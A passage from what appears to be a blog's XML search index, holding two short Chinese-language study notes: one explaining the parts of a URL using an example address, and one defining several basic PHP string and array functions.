href="http://thecat.top/">http://thecat.top</a>:80&#x2F;cat&#x2F;index.phpuserID&#x3D;1&amp;passwordID&#x3D;123456#OK</p><p>1.协议部分：该url的协议部分为http:&#x2F;&#x2F;</p><p>2.域名部分：该url的域名为thecat.top，也可以用ip作为域名来使用。</p><p>3.端口部分：跟在域名后面为端口，端口和域名之间用：作为间隔。端口不是url的必须部分。</p><p>4.虚拟目录部分：从域名后第一个&#x2F;开始到最后一个&#x2F;位置为虚拟目录位置，虚拟目录也并不是一个url所必须的部分。</p><p>5.文件名部分：从域名后的最后一个&#x2F;开始到？为止，为文件名部分，如果没有？，则是从域名后的最后一个&#x2F;开始到#为止。如果没有？或者#则从域名最后的一个&#x2F;开始到结束都是文件名部分。文件名部分也不是一个url所必须的部分</p><p>6.锚部分：从#开始到最后都是锚部分，锚点表示资源中的一种“书签”，给浏览器显示位于该“加书签”位置的内容的方向。锚部分也不是url所必须的部分。</p><p>7.参数部分从？开始到#号为止的部分为参数部分，又称搜索部分，查询部分等。参数部分可以存在多个参数，之间用&amp;连接。</p>]]></content>
      
      
      <categories>
          
          <category> web basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first php</title>
      <link href="/2023/11/15/day1/"/>
      <url>/2023/11/15/day1/</url>
      
        <content type="html"><![CDATA[<p>is_string()：检测变量是否是字符串<br>isset()：检测变量是否已设置并且非 NULL<br>in_array(要搜索的值，要搜索的数组)：搜索数组中是否存在指定的值<br>mb_substr($page，n，m)：返回page中从第n位开始，到n+m位字符串的值<br>mb_strpos()：查找字符串在另一个字符串中首次出现的位置<br>urldecode()：将url编码后的字符串还原成未编码的样子</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> school </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
